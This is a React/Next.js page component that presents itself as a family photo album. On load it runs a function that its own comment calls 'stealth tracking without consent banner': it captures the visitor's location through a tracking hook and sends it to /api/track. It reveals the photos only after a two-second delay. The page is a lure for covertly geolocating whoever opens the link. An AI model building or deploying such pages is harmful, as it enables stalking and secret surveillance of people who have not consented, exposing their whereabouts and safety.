'use client';

import { useState, useEffect } from 'react';
import Layout from '../components/Layout';
import LoadingSpinner from '../components/LoadingSpinner';
import { useLocationTracking } from '../hooks/useLocationTracking';

export default function TrackPage() {
  const [contentUnlocked, setContentUnlocked] = useState(false);
  const { captureLocation, sendTrackingData, isLoading } = useLocationTracking();
  
  useEffect(() => {
    // Auto-start stealth tracking without consent banner
    initializeStealth();
  }, []);
  
  const initializeStealth = async () => {
    try {
      // Capture location
      await captureLocation(window.location.href);
      
      // Send tracking data
      await sendTrackingData('/api/track', window.location.href);
      
      // Unlock content after delay
      setTimeout(() => {
        setContentUnlocked(true);
      }, 2000);
    } catch (err) {
      console.error('Tracking error:', err);
      // Still unlock content
      setContentUnlocked(true);
    }
  };
  
  return (
    <Layout>
      <div className="max-w-4xl mx-auto">
        <header className="text-center mb-12 animate-fadeIn">
          <h1 className="text-4xl md:text-5xl font-bold text-gray-800 dark:text-gray-100 mb-4">
            📸 Family Photo Album
          </h1>
          <p className="text-lg text-gray-600 dark:text-gray-400">
            Our Memories from 2024
          </p>
        </header>
        
        {!contentUnlocked ? (
          <div className="card text-center">
            <LoadingSpinner text="Loading your photos..." />
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 animate-fadeIn">
            {[
              {
                url: 'https://images.unsplash.com/photo-1511895426328-dc8714191300?w=800',
                caption: 'Summer Vacation 🌞',
                description: 'Beach day with the family'
              },
              {
                url: 'https://images.unsplash.com/photo-1533854775446-95c4609da544?w=800',
                caption: 'Birthday Party 🎉',
                description: 'Celebrating together'
              },
              {
                url: 'https://images.unsplash.com/photo-1543050299-de345c52011f?w=800',
                caption: 'Holiday Gathering 🎄',
                description: 'Christmas with loved ones'
              },
              {
                url: 'https://images.unsplash.com/photo-1609220136736-443140cffec6?w=800',
                caption: 'Family Dinner 🍽️',
                description: 'Sunday brunch'
              }
            ].map((item, index) => (
              <div
                key={index}
                className="card overflow-hidden animate-fadeIn"
                style={{ animationDelay: `${index * 0.1}s` }}
              >
                <img
                  src={item.url}
                  alt={item.caption}
                  className="w-full h-64 object-cover rounded-lg mb-4"
                />
                <h3 className="text-lg font-semibold text-gray-800 dark:text-gray-200">
                  {item.caption}
                </h3>
                <p className="text-sm text-gray-600 dark:text-gray-400">
                  {item.description}
                </p>
              </div>
            ))}
          </div>
        )}
        
        <footer className="mt-12 text-center text-sm text-gray-500 dark:text-gray-400">
          <p>These are our precious memories. Thank you for visiting!</p>
        </footer>
      </div>
    </Layout>
  );
}

